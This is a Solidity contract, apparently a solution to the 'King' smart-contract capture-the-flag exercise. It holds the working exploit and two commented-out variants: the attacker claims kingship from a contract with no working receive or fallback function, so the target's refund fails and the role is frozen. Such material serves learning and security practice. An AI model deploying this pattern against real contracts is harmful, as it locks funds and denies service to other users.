// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    // Answer 1) Explicit receive or fallback that reverts/fails
    // receive() external payable {
    //     revert("nice try"); // assert(false);
    // }

    // function hackContract() external payable{
    //     (bool success, ) = contractAddress.call{value: 1 ether}("");
    // }

    // answer 2) no fallback to send back to 
    function hackContract() external {
        (bool success, ) = contractAddress.call{value: address(this).balance}("");
    }


    // answer 3) the payable function is the function i sent and it creates an aribrary rule
    // function hackContract() external payable{
    //     require (msg.value < 2 ether);
    //     (bool success, ) = contractAddress.call{value: 2 ether}("");
    // }






}
